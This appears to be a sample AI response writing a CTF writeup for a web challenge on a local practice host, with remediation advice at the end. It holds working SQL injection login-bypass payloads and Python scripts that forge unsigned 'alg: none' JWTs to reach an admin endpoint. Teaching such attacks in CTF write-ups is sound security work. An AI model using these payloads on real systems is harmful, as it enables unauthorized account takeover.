# Example: CTF Writeup (Web Exploitation)

## User Request

```
Напиши CTF writeup для web challenge с SQL injection и JWT bypass.
```

## Reasoning

**Domain:** Education (CTF writeup, teaching security concepts)
**Complexity:** Medium
**Model:** Sonnet

## Response

---

# CTF Writeup: "SecureBank Login" (250 points)

**Category:** Web Exploitation
**Difficulty:** Medium
**Tags:** SQL Injection, JWT, Authentication Bypass
**Author:** CyberLabs CTF Team
**Solved by:** 47 / 250 teams

---

## Challenge Description

```
You've been hired to audit SecureBank's new online banking portal.
The developers claim it's "unhackable" - prove them wrong!

Goal: Login as admin and read the flag from /admin/flag.txt

Target: http://securebank.ctf.local:8080
```

---

## Initial Reconnaissance

### 1. Explore the Website

```bash
$ curl -i http://securebank.ctf.local:8080

HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Type: text/html

<!DOCTYPE html>
<html>
<head><title>SecureBank - Login</title></head>
<body>
    <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
</body>
</html>
```

**Observations:**
- Simple login form (username + password)
- POST to `/login` endpoint
- No visible version info or error messages yet

### 2. Test Login Functionality

```bash
$ curl -X POST http://securebank.ctf.local:8080/login \
  -d "username=test&password=test" \
  -c cookies.txt \
  -v

# Response:
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"error": "Invalid credentials"}
```

**Observations:**
- Returns JSON error message
- 401 status for failed login
- No cookies set on failure

---

## Vulnerability #1: SQL Injection in Login

### Discovery

Let's test for SQL injection:

```bash
# Test single quote
$ curl -X POST http://securebank.ctf.local:8080/login \
  -d "username=admin'&password=test"

# Response:
HTTP/1.1 500 Internal Server Error
Content-Type: application/json

{"error": "Database error: near \"'\": syntax error"}
```

**BINGO!** 🎯 The error message leaks SQL syntax error — vulnerable to SQL injection.

### Exploitation

#### Step 1: Test SQLi Payloads

```python
# sqli_test.py - Test various SQL injection payloads
import requests

url = "http://securebank.ctf.local:8080/login"

payloads = [
    "admin' OR '1'='1",           # Classic OR bypass
    "admin' OR 1=1--",            # Comment out rest
    "admin' OR 'x'='x",           # Another variation
    "admin' AND '1'='1",          # Test AND logic
]

for payload in payloads:
    data = {"username": payload, "password": "anything"}
    response = requests.post(url, data=data)

    print(f"Payload: {payload}")
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text[:100]}\n")
```

**Result:**
```bash
$ python3 sqli_test.py

Payload: admin' OR '1'='1
Status: 200
Response: {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}

✅ SUCCESS! Payload works!
```

#### Step 2: Extract JWT Token

```bash
$ curl -X POST http://securebank.ctf.local:8080/login \
  -d "username=admin' OR '1'='1&password=x" \
  | jq -r '.token'

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjQwOTk1MjAwfQ.xYz...
```

### Decode JWT

```bash
# Decode JWT (header.payload.signature)
$ echo "eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjQwOTk1MjAwfQ" | base64 -d | jq

{
  "user": "test",
  "role": "user",     # ← Not admin!
  "iat": 1640995200
}
```

**Problem:** The JWT has `role: "user"`, but we need `role: "admin"` to access `/admin/flag.txt`.

---

## Vulnerability #2: JWT Algorithm Confusion (None Algorithm)

### Discovery

JWT headers can specify different algorithms:
- HS256 (HMAC with SHA-256) — requires secret key
- RS256 (RSA signature) — requires private key
- **none** — No signature verification 🚨

Let's test if the server accepts `alg: "none"`:

```python
# jwt_bypass.py - Test JWT with "none" algorithm
import base64
import json
import requests

# Craft malicious JWT
header = {"alg": "none", "typ": "JWT"}
payload = {
    "user": "admin",
    "role": "admin",      # Escalate to admin!
    "iat": 1640995200
}

# Encode header and payload
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')

# JWT with no signature (just add empty signature with '.')
malicious_jwt = f"{header_b64.decode()}.{payload_b64.decode()}."

print(f"Malicious JWT: {malicious_jwt}")

# Test access to /admin endpoint
url = "http://securebank.ctf.local:8080/admin/flag.txt"
headers = {"Authorization": f"Bearer {malicious_jwt}"}

response = requests.get(url, headers=headers)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
```

**Result:**
```bash
$ python3 jwt_bypass.py

Malicious JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NDA5OTUyMDB9.

Status: 200
Response: CTF{5QL_1nj3ct10n_4nd_JWT_byp4ss_FTW}

🚩 FLAG CAPTURED!
```

---

## Full Exploit Script

```python
#!/usr/bin/env python3
# exploit.py - Full exploit chain

import requests
import base64
import json

TARGET = "http://securebank.ctf.local:8080"

def exploit():
    print("[*] Step 1: SQL Injection to bypass login")

    # SQL injection payload
    sqli_payload = {
        "username": "admin' OR '1'='1",
        "password": "x"
    }

    response = requests.post(f"{TARGET}/login", data=sqli_payload)

    if response.status_code != 200:
        print("[-] SQL injection failed")
        return

    print("[+] SQL injection successful! Got JWT token")

    # Step 2: Craft JWT with "none" algorithm
    print("[*] Step 2: Crafting JWT with 'none' algorithm")

    header = {"alg": "none", "typ": "JWT"}
    payload = {
        "user": "admin",
        "role": "admin",
        "iat": 1640995200
    }

    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')

    malicious_jwt = f"{header_b64.decode()}.{payload_b64.decode()}."

    print(f"[+] Malicious JWT: {malicious_jwt[:50]}...")

    # Step 3: Access admin endpoint
    print("[*] Step 3: Accessing /admin/flag.txt")

    headers = {"Authorization": f"Bearer {malicious_jwt}"}
    response = requests.get(f"{TARGET}/admin/flag.txt", headers=headers)

    if response.status_code == 200:
        print(f"[+] FLAG: {response.text}")
    else:
        print(f"[-] Failed to get flag: {response.status_code}")

if __name__ == "__main__":
    exploit()
```

**Run:**
```bash
$ python3 exploit.py

[*] Step 1: SQL Injection to bypass login
[+] SQL injection successful! Got JWT token
[*] Step 2: Crafting JWT with 'none' algorithm
[+] Malicious JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIj...
[*] Step 3: Accessing /admin/flag.txt
[+] FLAG: CTF{5QL_1nj3ct10n_4nd_JWT_byp4ss_FTW}
```

---

## Vulnerability Analysis & Remediation

### Vulnerability #1: SQL Injection

**Root Cause:**
```python
# Vulnerable code (pseudocode)
username = request.form['username']
password = request.form['password']

query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
# No input sanitization! Concatenation = SQLi
```

**Fix:**
```python
# Use parameterized queries (prepared statements)
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))
```

**Prevention:**
- Use ORM (SQLAlchemy, Django ORM) — automatic parameterization
- Never concatenate user input into SQL queries
- Use least-privilege database accounts (no DROP, no admin access)

### Vulnerability #2: JWT Algorithm Confusion

**Root Cause:**
```javascript
// Vulnerable JWT verification
const jwt = require('jsonwebtoken');

jwt.verify(token, secret);  // Accepts ANY algorithm in token header!
```

**Fix:**
```javascript
// Force specific algorithm
jwt.verify(token, secret, { algorithms: ['HS256'] });  // Only HS256 allowed
```

**Prevention:**
- Whitelist allowed algorithms explicitly
- Never allow `alg: "none"` in production
- Use battle-tested libraries (jose, PyJWT with algorithm enforcement)
- Rotate JWT secrets regularly

---

## Lessons Learned

### For CTF Players:
1. **Always test for SQL injection** — Try single quotes, OR 1=1, comment syntax
2. **Decode JWTs** — Use jwt.io or `echo | base64 -d`
3. **Test algorithm confusion** — Try `alg: "none"`, `alg: "HS256"` → `alg: "HS512"`
4. **Read error messages** — Verbose errors leak implementation details

### For Developers:
1. **Use parameterized queries** — NEVER concatenate user input
2. **Enforce JWT algorithms** — Whitelist allowed algorithms explicitly
3. **Least privilege** — Database user should only SELECT/INSERT, not DROP
4. **Hide error messages** — Generic "Invalid credentials" in production

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `curl` | Manual HTTP requests |
| `jq` | Parse JSON responses |
| `base64` | Decode JWT payloads |
| `python3 + requests` | Scripted exploitation |
| `jwt.io` | Online JWT decoder |

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)

---

## Flag

```
CTF{5QL_1nj3ct10n_4nd_JWT_byp4ss_FTW}
```

**Points:** 250
**Solve Time:** 1 hour 23 minutes
**Team:** HackTheBox

---

## Key Takeaways

1. **SQL Injection** — Test with single quotes, OR clauses, comments
2. **JWT Algorithm Confusion** — Try `alg: "none"` to bypass signature verification
3. **Error messages** — Verbose errors reveal vulnerabilities
4. **Defense in depth** — Multiple vulnerabilities chained = higher impact
5. **Writeups are teaching tools** — Explain WHY, not just HOW

**CTF Mindset:** Enumerate → Exploit → Document → Share knowledge
